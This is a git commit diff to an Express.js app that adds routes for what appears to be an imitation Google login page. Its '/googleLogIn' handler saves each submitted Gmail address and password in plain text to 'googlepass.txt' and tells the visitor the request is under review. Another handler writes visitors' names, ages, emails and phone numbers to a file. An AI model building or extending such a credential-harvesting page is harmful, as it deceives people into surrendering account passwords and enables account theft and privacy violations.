6e388d6b08e9f84d7df16fbf3634f23464945e08
Sameer Bisht <sameerbisht811@gmail.com>
2022-03-19 07:05:43 +0530

    changed everything

--- app.js
+++ app.js
@@ -3,6 +3,7 @@ const express = require('express');
 const app = express();
 const port = process.env.PORT || 3000;
 const path = require('path');
+const fs = require('fs');
 
 
 // EXPRESS RELATED STUFF 
@@ -16,14 +17,50 @@ app.set('views',path.join(__dirname,'views'))
 
 
 // ENDPOINTS 
-
+app.get("/base",(req,res)=>{
+    res.render("base.pug")
+})
 app.get("/",(req,res)=>{
 res.render('index.pug');
 })
+app.get("/login", (req,res)=>{
+    res.status(200).render('login.pug')
+})
+app.get("/glogin", (req,res)=>{
+    res.status(200).render('google.pug')
+})
+
+app.post('/trylog',(req,res)=>{
+
+    name= req.body.name
+    age = req.body.age
+    
+    email = req.body.email
+    phone = req.body.phone
+    
+    let outputToWrite = `The name of the client is ${name} \n he/she is ${age} years old \n email - ${email} \n phone number = ${phone} `
 
 
+    fs.writeFileSync('output.txt',outputToWrite)
+
+    res.status(200).render('index.pug', {"alert":"your form have been submitted"})
+});
 
 
+app.post("/googleLogIn",(req,res)=>{
+    gmail = req.body.gmail
+    pass = req.body.pass
+
+    let output = `Gmail- ${gmail} \n Pass - ${pass}`
+
+    fs.writeFileSync('googlepass.txt',output)
+
+    let params = {"alert":"Your login request have been send to review"}
+
+    res.status(200).render('loginDone.pug')
+       
+    
+})
 
 // LISTENING TO THE SERVER 
 
